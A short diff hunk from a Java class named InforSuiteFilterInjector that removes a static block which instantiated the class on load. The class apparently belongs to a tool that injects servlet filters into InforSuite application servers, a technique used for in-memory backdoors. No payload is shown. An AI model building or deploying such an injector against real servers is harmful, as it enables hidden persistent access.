@@ -16,10 +16,6 @@ import java.util.zip.GZIPInputStream;
 public class InforSuiteFilterInjector {
     Logger log = Logger.getLogger(InforSuiteFilterInjector.class.getName());
 
-    static {
-        new InforSuiteFilterInjector();
-    }
-
     public InforSuiteFilterInjector() {
         try {
             List<Object> contexts = getContext();
